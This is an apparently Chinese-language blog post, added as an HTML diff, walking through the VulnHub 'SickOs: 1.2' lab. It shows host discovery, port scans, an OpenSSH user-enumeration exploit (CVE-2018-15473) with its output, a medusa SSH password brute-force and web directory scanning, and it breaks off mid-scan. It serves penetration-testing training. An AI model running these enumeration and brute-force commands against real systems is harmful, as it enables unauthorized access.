@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub - SickOs: 1.2">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/12/21/SickOs%201.2/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-21T07:17:05.028Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="Insecure File Upload">
+<meta property="article:tag" content="Crontab">
+<meta property="article:tag" content="Dirty COW">
+<meta property="article:tag" content="SUID 提权">
+<meta property="article:tag" content="Iptables">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="HTTP PUT Method">
+<meta property="article:tag" content="Chkrootkit">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/12/21/SickOs%201.2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/12/21/SickOs%201.2/","path":"2024/12/21/SickOs 1.2/","title":"VulnHub - SickOs: 1.2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnHub - SickOs: 1.2 | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 主机探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-%E6%89%AB%E6%8F%8F"><span class="nav-text">3. SSH 扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">4. Web 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">5. 反弹 Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">6. 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirtycow-%E6%8F%90%E6%9D%83"><span class="nav-text">7.  DirtyCOW 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-text">8. Iptables</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">185</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">177</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/12/21/SickOs%201.2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnHub - SickOs: 1.2 | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub - SickOs: 1.2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-21 00:00:00 / 修改时间：15:17:05" itemprop="dateCreated datePublished" datetime="2024-12-21T00:00:00+08:00">2024-12-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>20 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-12,144/">SickOs:
+1.2 ~ VulnHub</a></p>
+</blockquote>
+<h2 id="主机探测">1. 主机探测</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.7</p>
+<h2 id="端口扫描">2. 端口扫描</h2>
+<ul>
+<li><p>TCP 扫描 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.159.7                               </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 20:57 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.7</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:81:09:FC (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 117.70 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># nmap -sSVC -p 22,80 192.168.159.7</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 21:57 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.7</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)</span><br><span class="line">|   2048 ba:86:f5:ee:cc:83:<span class="built_in">df</span>:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)</span><br><span class="line">|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)</span><br><span class="line">80/tcp open  http    lighttpd 1.4.28</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: lighttpd/1.4.28</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:81:09:FC (VMware)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>UDP 扫描</p></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sU --top-ports=&quot;1000&quot; 192.168.159.7</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 21:00 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.7</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.159.7 are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 1000 open|filtered udp ports (no-response)</span><br><span class="line">MAC Address: 00:0C:29:81:09:FC (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 38.67 seconds</span><br></pre></td></tr></table></figure>
+<h2 id="ssh-扫描">3. SSH 扫描</h2>
+<p>查询漏洞得 OpenSSH &lt; 7.7 - User Enumeration</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openssh</span><br><span class="line">…………</span><br><span class="line">OpenSSH &lt; 7.7 - User Enumeration (2)                               | linux/remote/45939.py</span><br></pre></td></tr></table></figure>
+<p>测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># python2 45939.py 192.168.159.7  root     </span></span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">[+] root is a valid username</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># python2 45939.py 192.168.159.7  user</span></span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">[-] user is an invalid username</span><br></pre></td></tr></table></figure>
+<p>批量测试脚本：<a
+target="_blank" rel="noopener" href="https://github.com/Sait-Nuri/CVE-2018-15473/tree/main">GitHub -
+Sait-Nuri/CVE-2018-15473: OpenSSH 2.3 &lt; 7.7 - Username
+Enumeration</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2018-15473.py 192.168.159.7 -w /usr/share/wordlists/wfuzz/general/common.txt</span><br></pre></td></tr></table></figure>
+<p>枚举结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Valid Users: </span><br><span class="line">backup</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">games</span><br><span class="line">list</span><br><span class="line">mail</span><br><span class="line">man</span><br><span class="line">news</span><br><span class="line">nobody</span><br><span class="line">proxy</span><br><span class="line">root</span><br><span class="line">sys</span><br></pre></td></tr></table></figure>
+<p>没得到什么特殊用户，root 测试弱口令未成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.159.7 -u root -P ../rockyou.txt -e ns -F </span><br></pre></td></tr></table></figure>
+<h2 id="web-信息收集">4. Web 信息收集</h2>
+<p>80 主页</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412201549779.jpg" /></p>
+<p>源码提示：<code>NOTHING IN HERE</code></p>
+<p>目录遍历</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># dirsearch -u &#x27;http://192.168.159.7&#x27; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -f -t 50  2&gt;&amp;/dev/null </span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">Extensions: txt, php | HTTP method: GET | Threads: 50 | Wordlist size: 882180</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/sickos1.2/reports/http_192.168.159.7/_24-12-19_21-59-21.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.7/</span><br><span class="line"></span><br><span class="line">[21:59:21] Starting:                                                                                                                                                                                                                        </span><br><span class="line">[21:59:29] 200 -    1KB - /test/                                            </span><br><span class="line">[21:59:29] 301 -    0B  - /test  -&gt;  http://192.168.159.7/test/             </span><br><span class="line">[22:50:54] 403 -  345B  - /%7Echeckout%7E                                    </span><br><span class="line">                                                                              </span><br><span class="line">Task Completed                                                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># dirsearch -u &#x27;http://192.168.159.7&#x27; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e zip,bak,svg,png,jpg -f -t 50  2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">Extensions: zip, bak, svg, png, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543815</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/sickos1.2/reports/http_192.168.159.7/_24-12-19_23-14-12.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.7/</span><br><span class="line"></span><br><span class="line">[23:14:12] Starting:                                                                                                                                                                                                                        </span><br><span class="line">[23:14:27] 301 -    0B  - /test  -&gt;  http://192.168.159.7/test/             </span><br><span class="line">[23:14:27] 200 -    1KB - /test/                                            </span><br><span class="line">[23:44:40] 200 -   46KB - /blow.jpg                                           </span><br><span class="line">[00:48:30] 403 -  345B  - /%7Echeckout%7E                                      </span><br><span class="line">                                                                                </span><br><span class="line">Task Completed                     </span><br></pre></td></tr></table></figure>
+<p>/blow.jpg 就主页图片，隐写分析没提取到有用信息……</p>
+<p>/test/ 是个空目录</p>
+<p>利用 Nikto 扫下 Web</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># nikto -h 192.168.159.7</span></span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.159.7</span><br><span class="line">+ Target Hostname:    192.168.159.7</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-12-20 02:19:11 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: lighttpd/1.4.28</span><br><span class="line">+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ No CGI Directories found (use <span class="string">&#x27;-C all&#x27;</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .</span><br><span class="line">+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</span><br><span class="line">+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</span><br><span class="line">+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</span><br><span class="line">+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</span><br><span class="line">+ /test/: Directory indexing found.</span><br><span class="line">+ /test/: This might be interesting.</span><br><span class="line">+ /<span class="comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span></span><br><span class="line">+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2024-12-20 02:19:51 (GMT-5) (40 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412201605319.jpg" /></p>
+<p>以为有密码。。。。。</p>
+<p>接着扫 test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># nikto -url http://192.168.159.7/test/ </span></span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.159.7</span><br><span class="line">+ Target Hostname:    192.168.159.7</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-12-20 02:41:07 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: lighttpd/1.4.28</span><br><span class="line">+ /test/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /test/: The 